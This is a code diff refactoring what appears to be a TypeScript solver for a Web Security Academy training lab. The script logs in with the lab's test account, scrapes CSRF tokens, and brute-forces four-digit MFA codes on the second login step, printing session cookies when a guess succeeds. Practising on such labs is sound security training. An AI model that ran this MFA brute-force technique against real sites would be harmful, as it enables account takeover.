@@ -5,60 +5,54 @@
 
 import { Sess } from "../base"
 
+const LABID = "0a8d009003d9e47288fe1aa600a70075"
+
 const iter = async (mfa1: number, mfa2: number) => {
 	const sess = new Sess()
-	const csrf1 = await sess
-		.req(
-			`
-					GET https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net/login HTTP/1.1
-					Upgrade-Insecure-Requests: 1
-					Sec-Fetch-Dest: document
-					Sec-Fetch-Mode: navigate
-					Sec-Fetch-Site: same-origin
-					Sec-Fetch-User: ?1
-				`,
-		)
-		.then(r => r.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0])
+	const csrf1 = await sess.req`
+		GET https://${LABID}.web-security-academy.net/login HTTP/1.1
+		Upgrade-Insecure-Requests: 1
+		Sec-Fetch-Dest: document
+		Sec-Fetch-Mode: navigate
+		Sec-Fetch-Site: same-origin
+		Sec-Fetch-User: ?1
+	`.then(r => r.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0])
 
-	await sess.req(`
-			POST https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net/login HTTP/1.1
-			Content-Type: application/x-www-form-urlencoded
-			Content-Length: 70
-			Origin: https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net
-			Upgrade-Insecure-Requests: 1
-			Sec-Fetch-Dest: document
-			Sec-Fetch-Mode: navigate
-			Sec-Fetch-Site: same-origin
-			Sec-Fetch-User: ?1
+	await sess.req`
+		POST https://${LABID}.web-security-academy.net/login HTTP/1.1
+		Content-Type: application/x-www-form-urlencoded
+		Content-Length: 70
+		Origin: https://${LABID}.web-security-academy.net
+		Upgrade-Insecure-Requests: 1
+		Sec-Fetch-Dest: document
+		Sec-Fetch-Mode: navigate
+		Sec-Fetch-Site: same-origin
+		Sec-Fetch-User: ?1
 
-			csrf=${csrf1}&username=carlos&password=montoya
-		`)
+		csrf=${csrf1}&username=carlos&password=montoya
+	`
 
-	const csrf2 = await sess
-		.req(
-			`
-					GET https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net/login2 HTTP/1.1
-					Upgrade-Insecure-Requests: 1
-					Sec-Fetch-Dest: document
-					Sec-Fetch-Mode: navigate
-					Sec-Fetch-Site: same-origin
-					Sec-Fetch-User: ?1
-				`,
-		)
-		.then(r => r.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0])
+	const csrf2 = await sess.req`
+		GET https://${LABID}.web-security-academy.net/login2 HTTP/1.1
+		Upgrade-Insecure-Requests: 1
+		Sec-Fetch-Dest: document
+		Sec-Fetch-Mode: navigate
+		Sec-Fetch-Site: same-origin
+		Sec-Fetch-User: ?1
+	`.then(r => r.bodreg(/name=\"csrf\" value=\"(.*)\">/)![0])
 
-	const r3 = await sess.req(`
-			POST https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net/login2 HTTP/1.1
-			Content-Type: application/x-www-form-urlencoded
-			Content-Length: 51
-			Origin: https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net
-			Sec-Fetch-Dest: document
-			Sec-Fetch-Mode: navigate
-			Sec-Fetch-Site: same-origin
-			Sec-Fetch-User: ?1
-	
-			csrf=${csrf2}&mfa-code=${(mfa1 + "").padStart(4, "0")}
-		`)
+	const r3 = await sess.req`
+		POST https://${LABID}.web-security-academy.net/login2 HTTP/1.1
+		Content-Type: application/x-www-form-urlencoded
+		Content-Length: 51
+		Origin: https://${LABID}.web-security-academy.net
+		Sec-Fetch-Dest: document
+		Sec-Fetch-Mode: navigate
+		Sec-Fetch-Site: same-origin
+		Sec-Fetch-User: ?1
+
+		csrf=${csrf2}&mfa-code=${(mfa1 + "").padStart(4, "0")}
+	`
 
 	if (r3.status() === 302) {
 		console.log("MFA SUCCESS:", r3.cookies())
@@ -67,19 +61,19 @@ const iter = async (mfa1: number, mfa2: number) => {
 		console.log("MFA FAILED: ", mfa1)
 	}
 
-	const r4 = await sess.req(`
-			POST https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net/login2 HTTP/1.1
-			Content-Type: application/x-www-form-urlencoded
-			Content-Length: 51
-			Origin: https://0a8d009003d9e47288fe1aa600a70075.web-security-academy.net
-			Upgrade-Insecure-Requests: 1
-			Sec-Fetch-Dest: document
-			Sec-Fetch-Mode: navigate
-			Sec-Fetch-Site: same-origin
-			Sec-Fetch-User: ?1
-	
-			csrf=${csrf2}&mfa-code=${(mfa2 + "").padStart(4, "0")}
-		`)
+	const r4 = await sess.req`
+		POST https://${LABID}.web-security-academy.net/login2 HTTP/1.1
+		Content-Type: application/x-www-form-urlencoded
+		Content-Length: 51
+		Origin: https://${LABID}.web-security-academy.net
+		Upgrade-Insecure-Requests: 1
+		Sec-Fetch-Dest: document
+		Sec-Fetch-Mode: navigate
+		Sec-Fetch-Site: same-origin
+		Sec-Fetch-User: ?1
+
+		csrf=${csrf2}&mfa-code=${(mfa2 + "").padStart(4, "0")}
+	`
 
 	if (r4.status() === 302) {
 		console.log("MFA SUCCESS:", r4.cookies())
